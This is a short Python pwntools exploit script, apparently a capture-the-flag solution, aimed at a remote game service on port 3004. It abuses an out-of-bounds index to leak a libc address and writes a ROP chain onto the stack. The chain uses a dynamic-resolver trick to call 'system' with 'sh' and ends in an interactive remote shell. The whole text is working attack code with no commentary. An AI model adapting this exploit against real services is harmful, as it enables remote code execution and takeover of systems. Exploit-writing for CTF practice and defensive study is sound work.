from pwn import *

HOST, PORT = "lolgame.acebear.site", "3004"
# HOST, PORT = "0.0.0.0", 31338
r = remote(HOST, PORT)

menu = lambda: r.recvuntil("Choice:")
ii = lambda x: r.sendline(str(x))
c0 = lambda: r.recvuntil(': ')

base = 57
pppr = 0x8048bd9
def write(index, value):
	menu()
	ii(3)
	c0()
	r.send('a' * 16 + chr(index))
	ii(1)
	ii(-value)
	for j in range(1, 4):
		ii(j)
		ii(j)
	r.recvuntil('Score:')
	return int(r.recvline())&0xffffffff
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
main = 0x8048a2a
puts = 0x80483d0
read = 0x80483b0
r.send('a')
for i in range(7,-1,-1):
	data = (write(54+i, 0))
	if data & 0xfff == 0x276:
		base = 53 + i
		print base
		libc.address = data - 0x18276
		break
bss = 0x8049800
read_dl = read + 6
cmd = 'sh'
payload = [
read,
pppr,
0,
0x8049050,
4,
read,
pppr,
0,
bss,
7 + len(cmd) + 1,
read_dl,
0,
bss + 7
]
for i in range(len(payload)):
	write(i + base,payload[i])

ii(4)
r.recvuntil('Bye!')
r.send(p32(bss-61) + 'system\x00' + cmd + '\x00')
r.interactive()
